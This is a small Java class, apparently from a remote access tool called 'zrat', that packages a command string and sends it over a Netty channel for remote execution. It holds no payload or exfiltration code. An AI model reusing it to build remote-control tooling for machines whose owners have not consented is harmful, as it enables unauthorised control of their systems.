package com.zrat.client.controller;

import org.jboss.netty.channel.Channel;

import com.zrat.transfer.model.TransferDataStruct;

public class CommandServiceImpl extends BaseService implements CommandService  {

	public CommandServiceImpl(Channel channel) {
		super(channel);
	}

	@Override
	public void runCommand(String command) {
		dataStruct = new TransferDataStruct(CommandService.COMMAND_RUNCOMAND);
		dataStruct.setObject(command);
		channel.write(dataStruct);
	}

}
